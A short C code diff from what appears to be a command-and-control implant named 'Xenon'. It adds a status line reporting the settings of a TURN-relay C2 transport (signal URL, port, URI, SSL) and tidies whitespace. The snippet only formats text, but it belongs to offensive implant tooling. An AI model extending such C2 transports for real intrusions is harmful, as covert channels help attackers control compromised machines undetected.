@@ -77,12 +77,25 @@ VOID AgentStatus(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
 #ifdef TCP_TRANSPORT
 
     PackageAddFormatPrintf(
-        data, 
-        FALSE, 
+        data,
+        FALSE,
         "%s:%d -> Server (%s), Client (%s)\n",
         xenonConfig->TcpBindAddress, xenonConfig->TcpPort,
         xenonConfig->TcpSocketServer == NULL ? "DEAD" : "ALIVE",
         xenonConfig->TcpSocketClient == NULL ? "DEAD" : "ALIVE"
+    );
+
+#endif
+
+#ifdef TURNC2_TRANSPORT
+
+    PackageAddFormatPrintf(
+        data,
+        FALSE,
+        "TURN C2: %s:%d%s (SSL: %s)\n",
+        xenonConfig->signalUrl, xenonConfig->signalPort,
+        xenonConfig->signalUri,
+        xenonConfig->signalSSL ? "yes" : "no"
     );
 
 #endif
